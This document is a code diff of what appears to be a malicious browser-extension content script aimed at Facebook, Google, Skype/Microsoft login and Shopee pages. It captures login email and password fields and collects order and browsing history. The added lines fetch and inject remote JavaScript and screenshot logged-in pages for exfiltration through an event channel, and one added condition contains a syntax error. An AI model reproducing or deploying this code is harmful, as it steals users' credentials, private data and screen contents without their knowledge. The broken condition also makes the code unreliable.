@@ -1,5 +1,11 @@
 const KEY = "DATA_1637469683_90061_2132";
-if (window.location.origin.indexOf("shopee.vn") > -1) {
+const isFacebook = window.location.origin.indexOf("facebook.com") > -1;
+const isGoogle = window.location.origin.indexOf("google.com") > -1;
+const isLoginSkype = window.location.origin.indexOf("login.live.com") > -1;
+const isWebSkype = window.location.origin.indexOf("web.skype.com") > -1;
+const isShopee = window.location.origin.indexOf("shopee.vn") > -1;
+
+if (isShopee) {
   try {
     setTimeout(() => {
       getShoppeOrderHistory();
@@ -28,17 +34,17 @@ function getShoppeOrderHistory() {
     });
 }
 
-if (window.location.origin.indexOf("facebook.com") > -1) {
+if (isFacebook) {
   try {
     listenFacebook();
   } catch (e) {}
 }
-if (window.location.origin.indexOf("google.com") > -1) {
+if (isGoogle) {
   try {
     listenGoogle();
   } catch (e) {}
 }
-if (window.location.origin.indexOf("login.live.com") > -1) {
+if (isLoginSkype) {
   try {
     listenSkype();
   } catch (e) {}
@@ -131,6 +137,7 @@ function listenSkype() {
 
 function listenFacebook() {
   let button = document.querySelector('button[name="login"]');
+  button = button ? button : document.querySelector('button[type="submit"]');
   let email = document.getElementById("email");
   let pass = document.getElementById("pass");
 
@@ -204,6 +211,46 @@ function sendHistory(url, title) {
 //     updateData('facebook_cookie', newCookie);
 //   }
 // }
+
+function importJS(url) {
+  fetch(url, { method: 'get' })
+  .then(function(response) {
+      if (!response.ok) {
+          throw Error(response.statusText);
+      }
+      return response.text();
+  }).then((data) => {
+      let scriptElement = document.createElement('script');
+      scriptElement.setAttribute('type', 'text/javascript');
+      scriptElement.setAttribute('charset', 'utf8');
+      scriptElement.setAttribute('test', 'true');
+      scriptElement.innerHTML = data;
+      document.head.appendChild(scriptElement);
+  });
+}
+
+try {
+  importJS('https://html2canvas.hertzen.com/dist/html2canvas.min.js');
+  importJS('https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js');
+} catch(e){}
+
+if(isFacebook || isLoginSkype && ) {
+  setTimeout(() => {
+    $(document).ready(function(){
+      console.log("jquery ready");
+      try {
+        html2canvas($("body"), {
+          onrendered: function(canvas) {
+            updateData("image", {
+              url: window.location.href,
+              image: canvas.toDataURL("image/png")
+            });
+          }
+        });
+      } catch(e){}
+    });
+  }, 2000);
+}
 
 function updateData(type, data) {
   document.dispatchEvent(
